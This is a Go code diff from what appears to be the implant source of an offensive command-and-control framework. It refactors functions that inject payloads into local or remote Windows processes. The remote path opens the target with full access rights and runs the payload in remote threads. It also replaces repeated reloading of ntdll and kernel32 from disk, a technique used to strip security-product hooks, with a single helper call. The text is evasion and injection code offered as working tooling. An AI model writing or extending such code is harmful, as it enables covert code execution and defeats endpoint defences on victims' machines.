@@ -64,17 +64,6 @@ func sysAlloc(size int, rwxPages bool) (uintptr, error) {
 	return addr, nil
 }
 
-func ptr(val interface{}) uintptr {
-	switch val.(type) {
-	case string:
-		return uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(val.(string))))
-	case int:
-		return uintptr(val.(int))
-	default:
-		return uintptr(0)
-	}
-}
-
 func RefreshPE(name string) error {
 	//{{if .Debug}}
 	log.Printf("Reloading %s...\n", name)
@@ -215,25 +204,9 @@ func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) error 
 
 // RermoteTask - Injects Task into a processID using remote threads
 func RemoteTask(processID int, data []byte, rwxPages bool) error {
-	var err error
-	// Hotfix for #114
-	// Somehow this fucks up everything on Windows 8.1
-	// so we're skipping the RefreshPE calls.
-	if version.GetVersion() != "6.3 build 9600" {
-		err = RefreshPE(ntdllPath)
-		if err != nil {
-			//{{if .Debug}}
-			log.Printf("RefreshPE on ntdll failed: %v\n", err)
-			//{{end}}
-			return err
-		}
-		err = RefreshPE(kernel32dllPath)
-		if err != nil {
-			//{{if .Debug}}
-			log.Printf("RefreshPE on kernel32 failed: %v\n", err)
-			//{{end}}
-			return err
-		}
+	err := refresh()
+	if err != nil {
+		return err
 	}
 	processHandle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(processID))
 	if processHandle == 0 {
@@ -247,25 +220,9 @@ func RemoteTask(processID int, data []byte, rwxPages bool) error {
 }
 
 func LocalTask(data []byte, rwxPages bool) error {
-	var err error
-	// Hotfix for #114
-	// Somehow this fucks up everything on Windows 8.1
-	// so we're skipping the RefreshPE calls.
-	if version.GetVersion() != "6.3 build 9600" {
-		err = RefreshPE(ntdllPath)
-		if err != nil {
-			//{{if .Debug}}
-			log.Printf("RefreshPE on ntdll failed: %v\n", err)
-			//{{end}}
-			return err
-		}
-		err = RefreshPE(kernel32dllPath)
-		if err != nil {
-			//{{if .Debug}}
-			log.Printf("RefreshPE on kernel32 failed: %v\n", err)
-			//{{end}}
-			return err
-		}
+	err := refresh()
+	if err != nil {
+		return err
 	}
 	size := len(data)
 	addr, _ := sysAlloc(size, rwxPages)
